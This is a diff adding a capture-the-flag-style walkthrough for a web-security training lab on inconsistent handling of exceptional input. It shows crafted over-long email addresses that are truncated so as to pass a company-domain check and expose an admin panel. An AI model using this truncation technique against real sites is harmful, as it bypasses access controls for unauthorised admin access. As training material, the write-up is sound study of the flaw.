@@ -269,6 +269,47 @@ productId=1&redir=PRODUCT&quantity=99
   <summary>Lab: Inconsistent handling of exceptional input</summary>
 
 
+* when ``rigester`` notice :
+
+```http
+If you work for DontWannaCry, please use your @dontwannacry.com email address
+```
+
+* rigester with any credintionals ``user : 123``
+* if you try to navgate ``/admin``
+
+  <img width="891" height="310" alt="image" src="https://github.com/user-attachments/assets/83a40260-124f-4337-ad9e-321ed8b07c98" />
+
+```http
+Admin interface only available if logged in as a DontWannaCry user 
+```
+
+
+- > now try to login with
+  > ```
+  > username: hack1
+  > email: very-long-string-very-long-string-very-long-string-very-long-string-very-long-string-very-long-string-very-long-string-very-long-string-very-long-string-very-long-string-very-long-string-very-long-string@exploit-0a2800d2030d83c3813fb53a01b800e2.exploit-server.net
+  > password: 123
+  > ```
+
+found the email cutted:
+
+<img width="1247" height="312" alt="image" src="https://github.com/user-attachments/assets/5a6adc6b-c13c-45a0-960e-c5e91138487a" />
+
+
+- > now try to login with
+  > ```
+  > username: hack2
+  > email: very-long-string-very-long-string-very-long-string-very-long-string-very-long-string-very-long-string-very-long-string-very-long-string-very-long-string-very-long-string-very-long-string-very-long-stringAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@dontwannacry.com.exploit-0a2800d2030d83c3813fb53a01b800e2.exploit-server.net
+  > password: 123
+  > ```
+
+now the email end with ``@dontwannacry.com`` and ``admin panal`` tap appear
+
+<img width="1349" height="365" alt="image" src="https://github.com/user-attachments/assets/18bee200-6ea4-4307-8f56-6bb90a39a8ad" />
+
+<img width="1284" height="461" alt="image" src="https://github.com/user-attachments/assets/f7776dd8-d20f-4df4-96e8-63654fa402e2" />
+
 
   
 </details>
